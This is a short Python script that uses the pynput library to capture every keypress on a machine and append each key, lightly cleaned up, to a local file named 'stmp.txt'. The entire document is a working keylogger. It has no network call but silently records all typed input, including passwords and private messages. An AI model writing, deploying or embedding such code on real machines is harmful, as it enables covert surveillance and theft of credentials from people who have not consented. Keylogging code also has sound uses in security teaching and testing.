from pynput.keyboard import Key, Listener
import json

def print_key(key):
    file = open("stmp.txt",'a')
    data = str(key)
    if ("Key." in data):
        data = data.replace("Key.", "")
    elif ("'" in data):
        data = data.replace("'", "").strip()

    file.write(data)
    file.close()

with Listener(on_press=print_key) as listener:
    listener.join()